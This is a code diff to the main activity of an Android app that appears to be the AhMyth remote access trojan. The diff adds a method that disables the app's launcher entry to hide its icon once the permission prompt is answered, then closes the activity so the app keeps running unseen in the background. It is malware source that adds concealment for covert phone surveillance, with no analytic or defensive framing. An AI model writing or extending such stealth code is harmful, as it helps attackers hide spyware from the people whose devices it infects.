@@ -2,6 +2,7 @@ package ahmyth.mine.king.ahmyth;
 
 import android.Manifest;
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -185,7 +186,29 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // Permissions granted or denied, continue anyway
+            // Permissions granted or denied, hide app icon and continue
+            hideAppIcon();
+            // Close activity immediately to run in background
+            finish();
+        }
+    }
+
+    private void hideAppIcon() {
+        // Disable launcher intent filter to hide icon from launcher
+        try {
+            ComponentName componentName = new ComponentName(
+                    MainActivity.this,
+                    "ahmyth.mine.king.ahmyth.MainActivity"
+            );
+            getPackageManager().setComponentEnabledSetting(
+                    componentName,
+                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    android.content.pm.PackageManager.DONT_KILL_APP
+            );
+            // Mark that icon has been hidden
+            prefs.edit().putBoolean("icon_hidden", true).apply();
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 }
